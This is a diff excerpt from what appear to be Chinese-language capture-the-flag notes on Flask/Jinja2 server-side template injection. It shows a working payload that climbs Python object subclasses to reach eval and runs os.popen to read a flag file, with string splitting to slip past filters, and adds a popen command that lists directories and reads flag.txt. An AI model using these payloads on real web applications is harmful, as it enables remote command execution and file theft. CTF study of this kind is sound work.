@@ -181,6 +181,8 @@ _io.TextIOWrapper 可以文件读取，可能在122位。
 读取flag
 {{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('cat /flasklight/coomme_geeeett_youur_flek ').read()")}}
 
+命令
+popen("cd ..;cd ..;cd ..;ls;cat flag.txt").read()
 
 ```
 
